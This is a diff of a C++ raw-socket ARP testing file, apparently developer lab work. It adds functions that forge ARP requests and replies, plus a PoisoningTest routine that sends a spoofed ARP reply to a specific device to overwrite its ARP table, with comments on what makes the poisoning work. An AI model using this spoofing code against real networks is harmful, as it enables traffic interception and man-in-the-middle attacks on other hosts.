@@ -9,56 +9,17 @@ Description : ARPTester
 
 #include "ARPTester.h"
 
-#include "../Headers/EthernetHeader.h"
+#include "../Headers/ARPHeader.h"
 #include "../Headers/IPv4Header.h"
 #include "../Headers/TCPHeader.h"
 #include "../Headers/UDPHeader.h"
-#include "../Headers/ICMPHeader.h"
 
 #include <net/if_arp.h>   // ARPOP_REQUEST
 #include <iostream>
 
+
 namespace ARPTester
 {
-    struct ARPHeader final
-    {
-        uint16_t htype {0};
-        uint16_t ptype {0};
-        uint8_t  hlen {};
-        uint8_t  plen {};
-        uint16_t opcode {0};
-        uint8_t  sender_mac[6]{};
-        uint32_t sender_ip {};
-        uint8_t  target_mac[6]{};
-        uint32_t target_ip {};
-
-    public:
-        bool SetSenderMACAddress(std::string_view mac) {
-            return EthernetHeader::SetMACAddress(mac.data(), sender_mac);
-        }
-
-        bool SetTargetMACAddress(std::string_view mac) {
-            return EthernetHeader::SetMACAddress(mac.data(), target_mac);
-        }
-
-        inline void SetSenderMACAddress(const uint8_t* const mac) {
-            std::copy_n(mac, std::size(sender_mac), sender_mac);
-        }
-
-        inline void SetTargetMACAddress(const uint8_t* const mac) {
-            std::copy_n(mac, std::size(target_mac), target_mac);
-        }
-
-        // TODO: Remove?
-        void SetSenderAddress(std::string_view address) {
-            sender_ip = inet_addr(address.data());
-        }
-
-        // TODO: Remove?
-        void SetTargetAddress(std::string_view address) {
-            target_ip = inet_addr(address.data());
-        }
-    } __attribute__((packed, aligned(1))) ;;
 
     EthernetHeader* initEthernetHeader(EthernetHeader* ethernetHeader,
                                        const sockaddr_ll& device,
@@ -70,7 +31,17 @@ namespace ARPTester
         return ethernetHeader;
     }
 
+    EthernetHeader* initEthernetHeader(EthernetHeader* ethernetHeader,
+                                       std::string_view srcMAC,
+                                       std::string_view dstMAC,
+                                       const uint16_t type = ETH_P_ARP) {
+        ethernetHeader->SetDestinationMACAddress(dstMAC.data());
+        ethernetHeader->SetSourceMACAddress(srcMAC.data());
+        ethernetHeader->SetType(type);
+        return ethernetHeader;
+    }
 
+    /*
     ARPHeader* initARPHeader(ARPHeader* arpHeader,
                              std::string_view sourceMac)
     {
@@ -81,19 +52,19 @@ namespace ARPTester
         arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
         arpHeader->opcode = htons(ARPOP_REQUEST);  // OpCode: 1 for ARP request
 
-        /** Sender hardware address (48 bits): MAC address **/
+        // Sender hardware address (48 bits): MAC address
         // memcpy(&arpHeader.sender_mac, device.sll_addr, 6 * sizeof (uint8_t));
         arpHeader->SetSenderMACAddress(sourceMac);
 
-        /** Target hardware address (48 bits): zero, since we don't know it yet. **/
+        // Target hardware address (48 bits): zero, since we don't know it yet.
         memset(&arpHeader->target_mac, 0,       6 * sizeof (uint8_t));
 
         return arpHeader;
     }
+    */
 
-    ARPHeader* initARPHeader(ARPHeader* arpHeader,
-                             const sockaddr_ll& device,
-                             std::string_view targetMac)
+    ARPHeader* initARPHeader_Request(ARPHeader* arpHeader,
+                                     const sockaddr_ll& device)
     {
         memset(arpHeader, 0, sizeof(ARPHeader));
         arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
@@ -103,11 +74,42 @@ namespace ARPTester
         arpHeader->opcode = htons(ARPOP_REQUEST);  // OpCode: 1 for ARP request
 
         /** Sender hardware address (48 bits): MAC address **/
-        // memcpy(&arpHeader.sender_mac, device.sll_addr, 6 * sizeof (uint8_t));
         arpHeader->SetSenderMACAddress(device.sll_addr);
 
-        /** Target hardware address (48 bits): zero, since we don't know it yet. **/
-        // memset(&arpHeader->target_mac, 0,       6 * sizeof (uint8_t));
+        return arpHeader;
+    }
+
+    ARPHeader* initARPHeader_Reply(ARPHeader* arpHeader,
+                                   const sockaddr_ll& device,
+                                   std::string_view targetMac)
+    {
+        memset(arpHeader, 0, sizeof(ARPHeader));
+        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
+        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
+        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
+        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
+        arpHeader->opcode = htons(ARPOP_REPLY);    // OpCode: 1 for ARP request
+
+        // This MAC will be used as the TARGET mac in re reply
+        // Tcpdump: Reply 192.168.57.54 is-at [targetMac]
+        arpHeader->SetSenderMACAddress(targetMac);
+        // arpHeader->SetTargetMACAddress(targetMac);
+
+        return arpHeader;
+    }
+
+    ARPHeader* initARPHeader_Reply(ARPHeader* arpHeader,
+                                   std::string_view senderMac,
+                                   std::string_view targetMac)
+    {
+        memset(arpHeader, 0, sizeof(ARPHeader));
+        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
+        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
+        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
+        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
+        arpHeader->opcode = htons(ARPOP_REPLY);    // OpCode: 1 for ARP request
+
+        arpHeader->SetSenderMACAddress(senderMac);
         arpHeader->SetTargetMACAddress(targetMac);
 
         return arpHeader;
@@ -124,47 +126,217 @@ namespace ARPTester
             std::exit(0);
         }
     }
-}
 
-void ARPTester::TestAll()
-{
-    constexpr std::string_view srcMac { "a8:93:4a:4e:00:6b" };
-    constexpr std::string_view dstMac { "f4:8c:eb:b8:b8:61" };
-    constexpr std::string_view interface { "wlp4s0" };
-
-    checkRunningUnderRoot();
-
-    sockaddr_ll device = Utilities::ResolveInterfaceAddress(interface);
-    uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};
-
-    initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,
-                       "01:01:00:00:00:01");
-
-    ARPHeader* arpHeader = initARPHeader(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
-                                         device, dstMac);
-
-    arpHeader->SetSenderAddress("111.111.111.111");
-    arpHeader->SetTargetAddress("222.222.222.222");
-
-    Utilities::SocketScoped socket = ::socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (-1 == socket) {
-        std::cout << "Failed to create socket. Error = " << errno << std::endl;
-        return;
+    // TODO: SocketScoped ----> Socket ???
+    // FIXME: We need to use SocketScoped in the right way. or follow the rule of 5 ??
+    Utilities::SocketScoped createSocket()
+    {
+        Utilities::SocketScoped socket = ::socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+        if (-1 == socket) {
+            std::cerr << "Failed to create socket. Error = " << errno << std::endl;
+            std::exit(0);
+        }
+        return socket;
     }
 
-    for (int i = 0; i < 20; ++i) {
+    void enableBroadcast(Utilities::SocketScoped& sock)
+    {
+        uint32_t broadcastEnable { 1 };
+        int32_t ret = setsockopt(sock, SOL_SOCKET, SO_BROADCAST,
+                                 &broadcastEnable, sizeof(broadcastEnable));
+        if (-1 == ret) {
+            std::cerr << "Failed to enable broadcast on socket (" << sock << ", Error = " << errno << std::endl;
+            std::exit(0);
+        }
+    }
 
-        long bytes = sendto(socket,
-                            reinterpret_cast<uint8_t *>(&packet),
-                            sizeof(packet),
-                            0,
-                            reinterpret_cast<sockaddr *>(&device),
-                            sizeof(device)
-        );
+
+}
+
+namespace ARPTester::Tests
+{
+    // constexpr std::string_view srcMac { "a8:93:4a:4e:00:6b" };
+    // constexpr std::string_view dstMac { "f4:8c:eb:b8:b8:61" };
+
+    constexpr std::string_view interfaceName { "wlp0s20f3" };
+    constexpr std::string_view interfaceIP { "192.168.57.54" };
+
+    // Comms_Sleeve: wlp1s0 --> 00:30:1a:4f:8d:c4
+    constexpr std::string_view cmsIfaceMac { "00:30:1a:4f:8d:c4" };
+
+    // Comms_Sleeve: wlan1 --> e4:5f:01:61:5b:fc
+    constexpr std::string_view cms_wlan1_Mac { "e4:5f:01:61:5b:fc" };
+
+    void TestSocket()
+    {
+        Utilities::SocketScoped socket = createSocket();
+    }
+
+    void SendRequest()
+    {
+        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
+        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};
+
+        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,
+                           "ff:ff:ff:ff:ff:ff");
+
+        /** To send request directly to Comms_Sleeve IP **/
+        // initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,
+        //                    cms_wlan1_Mac);
+
+        ARPHeader* arpHeader = initARPHeader_Request(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
+                                                     device);
+
+        // IP where replay packet shall be sent back
+        arpHeader->SetSenderAddress(interfaceIP);
+
+        // The MAC addr for this IP we want to find out: Gateway in the TII office
+        // arpHeader->SetTargetAddress("192.168.57.1");
+
+        // The MAC addr for this IP we want to find out: CommsSleeve IP address
+        arpHeader->SetTargetAddress("192.168.1.5");
+
+        Utilities::SocketScoped socket = createSocket();
+        enableBroadcast(socket);
+
+        for (int i = 0; i < 1; ++i) {
+
+            long bytes = sendto(socket,
+                                reinterpret_cast<uint8_t *>(&packet),
+                                sizeof(packet),
+                                0,
+                                reinterpret_cast<sockaddr *>(&device),
+                                sizeof(device)
+            );
+            if (-1 == bytes) {
+                std::cerr << "Error sending packet: " << errno << std::endl;
+            } else {
+                std::cout << bytes << " send\n";
+            }
+        }
+    }
+
+    void SendReply()
+    {
+        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
+        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};
+
+        // initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device, "ff:ff:ff:ff:ff:ff");
+
+        /** To send request directly to Comms_Sleeve IP **/
+        // initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,cms_wlan1_Mac);
+        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,"bc:6e:e2:03:74:ba");
+
+        ARPHeader* arpHeader = initARPHeader_Reply(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
+                                                   "7e:f3:00:31:60:8e",  // MAC of IP requested IP in REQUEST
+                                                   "bc:6e:e2:03:74:ba"); // MAC of 'Sender IP Address' from Request
+
+
+        // IP address for which the MAC has been requested in the Request ARP packet
+        // arpHeader->SetSenderAddress(interfaceIP);
+        arpHeader->SetSenderAddress("192.168.1.5");
+
+        // IP of the one WHO asked to resolve IP in corresponding Request ARP packet
+        // 'Target IP Address' in Repl shall be equal 'Sender IP Address' from Request
+        arpHeader->SetTargetAddress("192.168.57.54");
+
+        Utilities::SocketScoped socket = createSocket();
+        enableBroadcast(socket);
+
+        for (int i = 0; i < 1; ++i) {
+
+            long bytes = sendto(socket,
+                                reinterpret_cast<uint8_t *>(&packet),
+                                sizeof(packet),
+                                0,
+                                reinterpret_cast<sockaddr *>(&device),
+                                sizeof(device)
+            );
+            if (-1 == bytes) {
+                std::cerr << "Error sending packet: " << errno << std::endl;
+            } else {
+                std::cout << bytes << " send\n";
+            }
+        }
+    }
+
+
+    void PoisoningTest()
+    {
+        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
+        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};
+
+        // Have to send ARP Reply packet right to Comms_Sleeve interface MAC address
+        // otherwise it fail to set new value to the ARP table
+        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,
+                           cms_wlan1_Mac); /** To send request directly to Comms_Sleeve IP **/
+
+        // Target MAC address: doesn't matter in case when we want to overwrite the ARP table value
+        // or at least it looks like it
+        // 'Sender IP Address' ---> It the POISONED MAC address
+        ARPHeader* arpHeader = initARPHeader_Reply(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
+                                                   "22:22:22:22:33:33",  // MAC of IP requested IP in REQUEST
+                                                   "ff:ff:ff:ff:ff:ff"); // MAC of 'Sender IP Address' from Request
+
+        // IP address for which the MAC has been requested in the Request ARP packet
+        arpHeader->SetSenderAddress("192.168.57.56");
+
+        // IP of the one WHO asked to resolve IP in corresponding Request ARP packet
+        // 'Target IP Address' in Repl shall be equal 'Sender IP Address' from Request
+        //
+        // In case of ARP Poisoning: --> Looks like doesn't matter
+        // BUT: poisoning fails with 'Target IP Address' == "127.0.0.1
+
+        arpHeader->SetTargetAddress("192.168.1.6");
+        // arpHeader->SetTargetAddress("127.0.0.1");
+
+        Utilities::SocketScoped socket = createSocket();
+        enableBroadcast(socket);
+
+        long bytes = sendto(socket,reinterpret_cast<uint8_t *>(&packet),sizeof(packet),
+                            0,reinterpret_cast<sockaddr *>(&device),sizeof(device));
         if (-1 == bytes) {
             std::cerr << "Error sending packet: " << errno << std::endl;
         } else {
             std::cout << bytes << " send\n";
         }
     }
+}
+
+/**
+Request:  Broadcast    Who has 192.168.57.1? Tell 192.168.57.54
+
+    Address Resolution Protocol (request)
+        Hardware type: Ethernet (1)
+        Protocol type: IPv4 (0x0800)
+        Hardware size: 6
+        Protocol size: 4
+        Opcode: request (1)
+        Sender MAC address: IntelCor_03:74:ba (bc:6e:e2:03:74:ba)
+        Sender IP address: 192.168.57.54
+        Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)
+        Target IP address: 192.168.57.1
+
+Reply:  192.168.57.1 is at e8:eb:34:bf:80:2f
+
+    Address Resolution Protocol (reply)
+        Hardware type: Ethernet (1)
+        Protocol type: IPv4 (0x0800)
+        Hardware size: 6
+        Protocol size: 4
+        Opcode: reply (2)
+        Sender MAC address: Cisco_bf:80:2f (e8:eb:34:bf:80:2f)
+        Sender IP address: 192.168.57.1
+        Target MAC address: IntelCor_03:74:ba (bc:6e:e2:03:74:ba)
+        Target IP address: 192.168.57.54
+**/
+
+void ARPTester::TestAll()
+{
+    checkRunningUnderRoot();
+
+    // Tests::TestSocket();
+    // Tests::SendRequest();
+    // Tests::SendReply();
+    Tests::PoisoningTest();
 }
